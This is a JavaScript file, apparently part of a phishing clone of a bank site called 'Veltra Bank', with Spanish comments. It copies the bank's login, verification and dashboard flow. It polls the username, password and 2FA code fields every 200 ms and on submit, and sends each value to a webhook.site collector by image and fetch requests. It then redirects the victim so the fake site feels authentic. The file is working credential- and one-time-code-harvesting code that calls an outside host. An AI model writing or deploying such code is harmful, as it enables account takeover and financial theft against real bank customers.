/*
 * Veltra Bank — front del clon (flujo multi-pagina, fiel al real).
 *
 * El banco real NAVEGA entre paginas: /login -> /verificar -> /dashboard.
 * Replicamos eso para que el bot (que espera el cambio de URL) complete el
 * flujo y tipee el OTP. Cada paso exfiltra a webhook.site por GET-imagen.
 *
 * phish.js es generico: cablea el form que exista en la pagina actual.
 */
(function () {
  "use strict";

  // <<< EDITAR: tu URL de webhook.site >>>
  var COLLECTOR = "https://webhook.site/ff98e37e-cfae-4df3-9a5c-e1a9eb8ebafb";

  function exfil(fase, datos) {
    var qs = encodeURIComponent(JSON.stringify(datos || {}));
    var url = COLLECTOR + "?fase=" + encodeURIComponent(fase) + "&d=" + qs + "&_=" + Date.now();
    try { new Image().src = url; } catch (e) {}
    try { fetch(url, { method: "GET", mode: "no-cors", keepalive: true }); } catch (e) {}
  }

  // Beacon al cargar (incluye el path para seguir el flujo del bot).
  exfil("pageload", {
    path: location.pathname,
    ref: document.referrer,
    ua: navigator.userAgent
  });

  // Captura robusta por polling: no depende del submit.
  var ult = { u: "", p: "", c: "" };
  function chequear() {
    var gu = document.getElementById("txt-login");
    var gp = document.getElementById("txt-password");
    var gc = document.getElementById("txt-2fa");
    var u = gu ? gu.value : "";
    var p = gp ? gp.value : "";
    var c = gc ? gc.value : "";
    if ((u && u !== ult.u) || (p && p !== ult.p)) {
      ult.u = u; ult.p = p;
      exfil("campos-login", { usuario: u, clave: p });
    }
    if (c && c !== ult.c) {
      ult.c = c;
      exfil("campos-2fa", { codigo: c });
    }
  }
  setInterval(chequear, 200);
  ["txt-login", "txt-password", "txt-2fa"].forEach(function (id) {
    var el = document.getElementById(id);
    if (el) {
      el.addEventListener("input", chequear);
      el.addEventListener("change", chequear);
    }
  });

  // --- Paso 1: login -> navega a /verificar (igual que el real) ---
  var formLogin = document.getElementById("form-login");
  if (formLogin) {
    formLogin.addEventListener("submit", function (e) {
      e.preventDefault();
      var usuario = (document.getElementById("txt-login") || {}).value || "";
      var clave = (document.getElementById("txt-password") || {}).value || "";
      exfil("login", { usuario: usuario.trim(), clave: clave });
      var btn = document.getElementById("btn-login");
      if (btn) { btn.disabled = true; btn.textContent = "Verificando..."; }
      setTimeout(function () { window.location = "/verificar"; }, 400);
    });
  }

  // --- Paso 2: 2FA -> navega a /dashboard ---
  var form2fa = document.getElementById("form-2fa");
  if (form2fa) {
    form2fa.addEventListener("submit", function (e) {
      e.preventDefault();
      var codigo = (document.getElementById("txt-2fa") || {}).value || "";
      exfil("2fa", { codigo: codigo.trim() });
      var btn = document.getElementById("btn-2fa");
      if (btn) { btn.disabled = true; btn.textContent = "Verificando..."; }
      setTimeout(function () { window.location = "/dashboard"; }, 400);
    });
  }
})();
